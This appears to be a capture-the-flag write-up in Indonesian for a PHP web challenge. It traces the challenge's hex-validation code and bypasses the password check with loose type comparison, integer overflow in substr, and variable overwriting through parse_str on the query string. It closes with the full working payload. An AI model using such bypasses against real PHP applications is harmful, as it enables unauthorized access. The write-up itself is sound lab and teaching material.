## PHP Compare (Web Exploitation)

### Reference
- https://cxsecurity.com/issue/WLB-2007060061

### Proof of Concept
- Download source code 
```
http://chall.ctfs.me:8002/compare-us/
```
- Step by Step
	- Server meminta inputan ```$_GET['key']``` dan akan divalidasi oleh ```ctype_xdigit``` terlebih dahulu, jadi inputan harus mencakup bilangan hexa antara 1-9 dan A-F. [View code](compare.php#L6-L7)
	- Sekarang kita coba untuk *tracing* dari kode berikut ini. [View code](compare.php#L8-L9) 
	```php
	$A = "43544653"; // CTFS
	$e = implode('', array_map(function ($i, $A) {
	        return chr(hexdec($A{$i + $i} . $A{$i + ($i + 1)}));
	    }, list($m, $n, $o) = range(0, 2), array($A, $A, $A))
	);
	print "{$A} => {$e}" . PHP_EOL; // 43544653 => CTF
	``` 
	Output yang dikeluarkan hanya 3digit, karna dari callback ```array_map``` hanya meminta 3 array ```array($A, $A, $A)```, jadi inti dari kode diatas iyalah mengkonversi hexa to string dan mengeluarkan output max 3digit string, di line 9 terdapat pengecekan ```$e < 1 && $e > 0 && $e !== 0``` jadi kita dapat mengambil **0.5** antara 0 sampai 1.

	- Next dari *tracing* kode diatas kita mendapatkan ```$A = "302e35";``` lanjut ke pengecekan kode selanjutnya pada line 10. [View code](compare.php#L10) Pada pengecekan selanjutnya iyalah ```substr``` dan output yang dihasilkan harus kurang dari **-1** 

	```php
	$A = "302e359999999999999999999999999999999";
	$e = implode('', array_map(function ($i, $A) {
	        return chr(hexdec($A{$i + $i} . $A{$i + ($i + 1)}));
	    }, list($m, $n, $o) = range(0, 2), array($A, $A, $A))
	);
	print ((int) (substr($A, strlen($e) * 2) + 0)) . PHP_EOL; // -4571153621781053440
	```

	- Ternyata masih ada lagi pengecekan ```($check == $_GET['password'])``` karna sebelumnya ada ```parse_str($_SERVER['QUERY_STRING']);``` jadi kita dapat membypass dengan menambahkan ```check=0&password=0``` pada parameter url.

- Capture the flag :triangular_flag_on_post:
```
Payload : key=302e359999999999999999999999999999999&check=0&password=0
```